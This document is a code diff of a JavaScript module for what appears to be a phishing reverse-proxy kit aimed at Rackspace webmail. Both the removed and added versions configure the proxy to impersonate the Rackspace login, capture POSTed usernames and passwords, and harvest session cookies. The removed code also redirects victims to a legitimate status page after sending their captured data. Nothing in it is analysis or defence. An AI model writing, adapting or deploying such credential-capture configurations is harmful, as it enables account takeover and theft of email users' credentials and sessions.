@@ -1,154 +1,52 @@
 /* eslint-disable camelcase,class-methods-use-this */
 // eslint-disable-next-line max-classes-per-file
 const path = require('path')
-const url = require('url')
+const fs = require('fs')
+const superagent = require('superagent');
+
 
 // eslint-disable-next-line import/no-dynamic-require
 const globalWorker = process.HOOK_JS_MODULE
 
-/** Defined Functions used */
-
-
 /** Important Defaults */
-const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {
-
-    constructor(proxyEndpoint, browserReq) {
-        super(proxyEndpoint, browserReq)
-    }
-
-    processRequest() {
-        return super.processRequest()
-
-    }
-}
-
-const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
-
-    constructor(proxyResp, browserEndPoint) {
-       
-        super(proxyResp, browserEndPoint)
-        this.regexes = [
-             {
-                reg: /name="destination" value=".+?"/igm, // Google chrome on windows fix
-                replacement: `name="destination" value="https://${browserEndPoint.clientSession.currentDomain}"`,
-             },
-        ]
-    }
-
-
-    processResponse() {
-        if (this.proxyResp.headers['content-length'] < 1) {
-            return this.proxyResp.pipe(this.browserEndPoint)
-        }
-
-        const extRedirectObj = super.getExternalRedirect()
-        if (extRedirectObj !== null) {
-           const rLocation = extRedirectObj.url
-           
-        }
-
-        // return super.processResponse()
-         let newMsgBody;
-        return this.superPrepareResponse(true)
-            .then((msgBody) => {
-                newMsgBody = msgBody
-                for (let i = 0; i < this.regexes.length; i += 1) {
-                    const regExObj = this.regexes[i]
-                    if (regExObj.reg.test(newMsgBody)) {
-                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
-                    }
-                }
-                this.superFinishResponse(newMsgBody)
-            }).catch((err) => {
-            console.error(err)
-        })
-    }
-
-    concludeAuth() {
-        console.log('Concluding path')
-
-    }
-}
-
-
-const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
-    constructor(req, res, captureDict = configExport.CAPTURES) {
-        super(req, res, captureDict)
-    }
-
-    static match(req) {
-        return true
-
-    }
-
-    execute(clientContext) {
-
-        if (this.req.method === 'POST') {
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-
-            super.captureBody(clientContext.currentDomain, clientContext)
-
-        }
-
-
-        const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
-
-        if (this.req.url === '/owa/') {
-            
-            clientContext.setLogAvailable(true);
-            super.sendClientData(clientContext, {})
-            this.res.writeHead(302, { location: 'https://status.apps.rackspace.com/' })
-            return this.res.end('')
-        }
-
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
-
-    }
-}
-
-
-
 
 const configExport = {
-    CURRENT_DOMAIN: 'mex06.emailsrvr.com',
+    SCHEME: 'rackspace',
 
-    START_PATH: '/owa/auth/logon.aspx',
+    CURRENT_DOMAIN: 'apps.rackspace.com',
+
+    START_PATH: '/wmidentity/Account/Login',
+
+    COOKIE_PATH: ['/a/webmail.php.*'],
+
+    EXIT_TRIGGER_PATH: [],
+
+    EXIT_URL: 'https://rackspace.com/a/webmail.php',
 
 
-    PRE_HANDLERS:
-        [
-        ],
-    PROXY_REQUEST: ProxyRequest,
-    PROXY_RESPONSE: ProxyResponse,
-    DEFAULT_PRE_HANDLER: DefaultPreHandler,
+    EXTERNAL_FILTERS:[],
+
+
+    PRE_HANDLERS:[],
+   
+    PROXY_REQUEST: 'DEFAULT',
+    PROXY_RESPONSE: 'DEFAULT',
+    DEFAULT_PRE_HANDLER: 'DEFAULT',
 
     CAPTURES: {
-        rackspaceUsername: {
+        rackspaceUser: {
             method: 'POST',
             params: ['username'],
             urls: '',
-            hosts: ['mex06.emailsrvr.com'],
+            hosts: ['apps.rackspace.com']
         },
-
         rackspacePassword: {
             method: 'POST',
             params: ['password'],
             urls: '',
-            hosts: ['mex06.emailsrvr.com'],
+            hosts: ['apps.rackspace.com']
         },
-
-
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
+       
     },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
